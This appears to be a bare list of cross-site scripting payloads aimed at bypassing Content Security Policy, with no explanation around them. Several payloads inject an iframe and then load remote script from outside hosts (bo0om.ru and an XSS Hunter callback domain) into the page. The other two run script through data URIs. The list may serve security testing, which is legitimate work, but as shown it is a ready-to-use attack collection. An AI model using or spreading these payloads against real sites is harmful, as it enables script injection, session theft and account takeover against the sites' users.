	http://hsts.pro/csp.php?xss=f=document.createElement%28%22iframe%22%29;f.id=%22pwn%22;f.src=%22/robots.txt%22;f.onload=%28%29=%3E%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;
	script=document.createElement('script');
	script.src='//bo0om.ru/csp.js';
	window.frames[0].document.head.appendChild(script);

	https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f
	d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)

	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

	<script src="data:,alert(1)">/</script>

